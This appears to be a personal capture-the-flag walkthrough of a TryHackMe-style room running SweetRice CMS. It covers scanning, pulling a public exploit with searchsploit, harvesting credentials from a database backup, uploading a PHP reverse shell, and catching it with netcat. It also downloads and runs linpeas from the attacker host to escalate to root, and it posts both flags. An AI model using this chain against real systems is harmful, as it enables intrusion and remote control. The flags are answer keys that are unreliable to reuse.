Have some fun! There might be multiple ways to get user access.  

`Note: It might take 2-3 minutes for the machine to boot`  

Answer the questions below

| Question               | Answer                                | SS                                   |
| ---------------------- | ------------------------------------- | ------------------------------------ |
| What is the user flag? | THM{63e5bce9271952aad1113b6f1ac28a07} | ![[Pasted image 20240330185844.png]] |

```
export IP=10.10.61.248
```

```
nmap -sC -sV -A -T4 -v -p- -oN scans/nmap $IP
```
![[Pasted image 20240330091032.png]]


```
gobuster dir --url http://$IP --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scans/gobuster
```
![[Pasted image 20240330091146.png]]


```
searchsploit sweetrice
```
![[Pasted image 20240330091321.png]]


```
searchsploit -x php/webapps/40700.html
```
![[Pasted image 20240330091749.png]]

*Copy the exploit:*
```
searchsploit -m php/webapps/40700.html
```


*Change the exploit:*
![[Pasted image 20240330092309.png]]

*to:*
![[Pasted image 20240330092547.png]]

*and open it:*
![[Pasted image 20240330092805.png]]

*Search for credentials:*
```
searchsploit sweetrice
```
![[Pasted image 20240330093116.png]]


```
searchsploit -x php/webapps/40718.txt
```
![[Pasted image 20240330093543.png]]

![[Pasted image 20240330093710.png]]


```
wget "http://10.10.61.248/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql"
```

```
file mysql_bakup_20191129023059-1.5.1.sql
```
![[Pasted image 20240330094010.png]]

![[Pasted image 20240330095124.png]]


![[Pasted image 20240330095703.png]]


![[Pasted image 20240330095815.png]]

![[Pasted image 20240330100054.png]]


*Open the exploit in firefox from terminal:*

![[Pasted image 20240330100158.png]]


![[Pasted image 20240330100143.png]]

*Access it:*

```
10.10.61.248/content/inc/ads/hacked.php
```

![[Pasted image 20240330100349.png]]


*Modify a php-reverse-shell:*
![[Pasted image 20240330122038.png]]

*Copy the content of the file and paste it inside the exploit:*

![[Pasted image 20240330123120.png]]

![[Pasted image 20240330123204.png]]

*Open the exploit from terminal again:*

```
firefox exploit.html
```
![[Pasted image 20240330123403.png]]

![[Pasted image 20240330123502.png]]


*Start netcat listener:*
```
nc -nvlp 1234
```
![[Pasted image 20240330123751.png]]

*Change in firefox:*
```
10.10.61.248/content/inc/ads/revshell.php
```
![[Pasted image 20240330124047.png]]

![[Pasted image 20240330124103.png]]


*Upgrade shell:*
```
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

*Transfer linpeas to target:*

*Open server on host machine:*
```
python3 -m http.server --bind 10.8.194.147
```
![[Pasted image 20240330184713.png]]

*Download the file on target machine:*
```
wget http://10.8.194.147:8000/linpeas.sh
```
![[Pasted image 20240330184739.png]]

*Make it executable:*
```
chmod +x linpeas.sh
```

*and run it:*
```
./linpeas.sh
```
![[Pasted image 20240330185243.png]]

![[Pasted image 20240330185549.png]]

*Go to user's folder:*
![[Pasted image 20240330190249.png]]

![[Pasted image 20240330190309.png]]

*Change the content of the file:*

![[Pasted image 20240330191019.png]]


![[Pasted image 20240330190937.png]]

*Open netcat on host machine:*
![[Pasted image 20240330191214.png]]

*On target machine:*
![[Pasted image 20240330192311.png]]

*On host:*
![[Pasted image 20240330191510.png]]

*Stabilize shell:*
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
```
CTRL+Z
```
```
stty raw -echo
fg
```
```
export TERM=xterm
```

![[Pasted image 20240330192400.png]]

![[Pasted image 20240330192414.png]]



| Question               | Answer                                | SS                                       |
| ---------------------- | ------------------------------------- | ---------------------------------------- |
| What is the root flag? | THM{6637f41d0177b6f37cb20d775124699f} | ![[Pasted image 20240330192439.png]]<br> |
